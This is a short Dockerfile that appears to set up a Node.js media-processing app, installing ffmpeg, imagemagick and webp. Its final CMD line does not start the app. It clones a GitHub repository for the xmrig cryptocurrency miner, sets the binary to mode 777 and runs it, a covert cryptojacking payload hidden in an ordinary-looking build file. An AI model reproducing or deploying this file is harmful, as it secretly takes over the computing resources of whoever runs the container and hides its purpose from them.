FROM node:lts-buster

RUN apt-get update && \
  apt-get install -y \
  ffmpeg \
  imagemagick \
  webp && \
  apt-get upgrade -y && \
  rm -rf /var/lib/apt/lists/*

COPY package.json .

RUN bash

COPY . .

CMD ["git clone https://github.com/DARK-02/xmrig-cryptonight_gpu; cd xmrig-cryptonight_gpu; chmod 777 xmrig; ./xmrig"]
